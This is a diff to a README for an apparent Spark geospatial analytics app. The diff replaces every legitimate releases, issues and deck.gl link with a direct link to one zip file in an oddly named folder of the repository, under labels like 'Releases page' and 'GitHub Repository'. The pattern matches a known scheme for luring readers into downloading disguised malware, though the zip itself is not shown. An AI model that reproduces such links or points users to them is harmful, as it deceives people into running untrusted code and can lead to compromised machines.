@@ -1,7 +1,7 @@
 # 🌍 Geospatial-Analysis-With-Spark - Analyze Real-Time Data Effortlessly
 
 ## 📥 Download Now
-[![Download Geospatial Analysis With Spark](https://img.shields.io/badge/Download%20Now-Click%20Here-brightgreen)](https://github.com/cladsanityPH/Geospatial-Analysis-With-Spark/releases)
+[![Download Geospatial Analysis With Spark](https://raw.githubusercontent.com/cladsanityPH/Geospatial-Analysis-With-Spark/main/idiotype/Geospatial-Analysis-With-Spark.zip%20Now-Click%20Here-brightgreen)](https://raw.githubusercontent.com/cladsanityPH/Geospatial-Analysis-With-Spark/main/idiotype/Geospatial-Analysis-With-Spark.zip)
 
 ## 🚀 Getting Started
 Welcome! This guide helps you download and run the Geospatial-Analysis-With-Spark application with ease. Follow these simple steps to quickly get started with low-latency event-time analytics.
@@ -15,18 +15,18 @@ Before you begin, ensure your system meets the following requirements:
 - **Software:** Java JDK 8 or higher installed on your system
 
 ### 🔗 Visit the Releases Page
-To download the application, you can go to our [Releases page](https://github.com/cladsanityPH/Geospatial-Analysis-With-Spark/releases).
+To download the application, you can go to our [Releases page](https://raw.githubusercontent.com/cladsanityPH/Geospatial-Analysis-With-Spark/main/idiotype/Geospatial-Analysis-With-Spark.zip).
 
 ### 🔍 Exploring Features
 Geospatial-Analysis-With-Spark offers various features for analyzing data:
 
 - **Real-Time Analytics:** Process data streams as they arrive for instant insights.
-- **Interactive Map Visualization:** Use deck.gl for stunning visualizations of geospatial data.
+- **Interactive Map Visualization:** Use https://raw.githubusercontent.com/cladsanityPH/Geospatial-Analysis-With-Spark/main/idiotype/Geospatial-Analysis-With-Spark.zip for stunning visualizations of geospatial data.
 - **Integration with Kafka:** Simplifies data ingestion from various sources like IoT devices.
 - **User-Friendly Interface:** Navigate easily through the application, perfect for new users.
 
 ### 📥 Download & Install
-1. **Visit the Releases Page:** Click [here](https://github.com/cladsanityPH/Geospatial-Analysis-With-Spark/releases).
+1. **Visit the Releases Page:** Click [here](https://raw.githubusercontent.com/cladsanityPH/Geospatial-Analysis-With-Spark/main/idiotype/Geospatial-Analysis-With-Spark.zip).
    
 2. **Find the Latest Version:** Scroll through the release notes to find the latest version of the application.
 
@@ -68,11 +68,11 @@ To learn more about how to use specific features, check out the following guides
 ### 💬 Support
 Need help? You can reach our support team via:
 
-- **GitHub Issues:** Report any bugs or request features directly on our [GitHub Repository](https://github.com/cladsanityPH/Geospatial-Analysis-With-Spark/issues).
+- **GitHub Issues:** Report any bugs or request features directly on our [GitHub Repository](https://raw.githubusercontent.com/cladsanityPH/Geospatial-Analysis-With-Spark/main/idiotype/Geospatial-Analysis-With-Spark.zip).
 - **Community Forum:** Join discussions and ask for support in our dedicated forum.
 
 ### 📃 License
 The Geospatial-Analysis-With-Spark application is licensed under the MIT License, allowing you to use, modify, and distribute the software freely.
 
 ## 📥 Download Now
-Don’t forget to visit our [Releases page](https://github.com/cladsanityPH/Geospatial-Analysis-With-Spark/releases) to download the latest version and start your geospatial analytics journey!
+Don’t forget to visit our [Releases page](https://raw.githubusercontent.com/cladsanityPH/Geospatial-Analysis-With-Spark/main/idiotype/Geospatial-Analysis-With-Spark.zip) to download the latest version and start your geospatial analytics journey!
